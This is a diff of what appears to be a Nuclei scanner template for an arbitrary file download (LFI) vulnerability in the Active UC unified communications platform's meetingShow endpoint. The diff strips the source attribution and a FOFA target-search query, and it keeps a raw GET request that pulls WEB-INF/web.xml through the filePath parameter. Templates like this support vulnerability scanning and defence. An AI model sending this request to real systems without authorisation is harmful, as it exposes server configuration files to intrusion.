@@ -3,12 +3,8 @@ info:
   name: 网动统一通信平台 meetingShow 任意文件下载漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cyhh7it5ewggc0sg'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cyhh7it5ewggc0sg
-    fofa: title="网动统一通信平台(Active UC)"
 http:
 - raw:
   - 'GET /acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml&filename=xxx HTTP/1.1
